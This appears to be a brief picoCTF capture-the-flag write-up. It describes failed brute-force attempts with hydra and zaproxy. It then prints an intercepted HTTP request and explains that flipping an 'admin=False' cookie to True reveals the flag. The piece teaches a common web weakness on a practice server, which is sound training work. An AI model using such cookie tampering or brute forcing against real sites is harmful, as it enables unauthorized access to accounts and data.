Here we need to log in .. is very easy because we can do it even without password. We have two hints one of them says that Joe have a super secret password. 

I was trying to get that password testing brute force attacks with hydra and with  zaproxy. No success.

So ... I just intercepted the success logins with any user.. 

```
GET /flag HTTP/1.1
Host: jupiter.challenges.picoctf.org:15796
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://jupiter.challenges.picoctf.org:15796/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: password=gg; username=asd; admin=False
Connection: close
```

You just need to change the admin false to True and you will be able to get the flag

picoCTF{*+*+*+*+*+*+*+*+*+*+*+*+}
